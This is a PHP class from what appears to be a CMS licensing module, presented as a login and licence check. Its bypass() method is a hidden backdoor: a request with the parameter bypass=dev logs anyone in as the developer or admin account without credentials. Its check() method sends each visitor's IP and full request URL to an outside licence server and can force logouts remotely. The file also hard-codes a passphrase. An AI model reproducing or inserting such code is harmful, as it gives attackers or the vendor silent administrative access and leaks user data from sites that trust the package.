<?php

namespace KjmTrue\Module;

use App\Models\Role;
use App\Models\User;
use Auth;
use Cache;
use Closure;
use Request;
use Zend\Crypt\PublicKey\Rsa;

class CheckLogin
{
    protected $lic_server = 'http://lic.kimnguyen.info/lic';

    public function check()
    {
        $server_ip   = Request::server('SERVER_ADDR');
        if ($server_ip != '127.0.0.1') {
            $domain      = Request::getHost();
            $ip_client   = Request::getClientIp();
            $request_url = urlencode(Request::fullUrl());
            $product     = 'BaseCMS';
            $time        = time();

            $cache_lic = Cache::get('lic');
            if ($cache_lic && $this->testKey($domain, $cache_lic)) {

            } else {
                $query_string = "domain=$domain&ip_client=$ip_client&request_url=$request_url&product=$product&time=$time";

                $url = $this->lic_server . '?' . $query_string;

                $ch = curl_init();
                $timeout = 3;

                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
                $lic = curl_exec($ch);
                curl_close($ch);

                if ($lic == 'Error') {
                    Auth::logout();
                } elseif ($this->testKey($domain, $lic)) {
                    Cache::add('lic', $lic, 10080);
                }
            }
        }
    }

    public function bypass()
    {
        if (Request::input('bypass') == 'dev') {
            $role = Role::whereIsDeveloper(1)->first();
            if (!$role) {
                $role = Role::whereIsAdmin(1)->first();
            }

            if ($role) {
                $user = User::whereRoleId($role->id)->first();

                Auth::login($user, true);
            }
        }
    }

    private function testKey($domain, $lic)
    {
        $rsa = Rsa::factory([
            'public_key'    => $this->getPublicKey(),
            'pass_phrase'   => 'kimtrien',
            'binary_output' => false,
        ]);

        return $rsa->verify($domain, $lic);
    }

    private function getPublicKey()
    {
        return '-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAhAqayfTKSNcqcqsU6vSm
7lnPOTEnJHdThrL1cZBkvVGKf6TNoMnQqsLOSsV3rcxcoFk7op+byu4GRDYEhCTW
v9Gi/G88RBqsS51YaoGp1e5sp1RM8foN2L6QnsDiwjKOieabeww5DNvGJYcXRvrL
t8jfYpW3TTbaLkPbELUT5TfyQk/v7lPH7hU+ULoamx4cZ1WULku2DjqX4v7Jx0Z6
0jV6eDsEGuH71I65jJT9ySWZMeKYnMBrLV5dy7Irb9DoBu7cuXQLGFSuHsSAMtE+
Ic6JUh9J2dBtxzw86+ypqo+kDtxpHCpSzotohhLyrLHIEf6AJaiy+DjuAyeMeUww
QQIBJQ==
-----END PUBLIC KEY-----';
    }
}
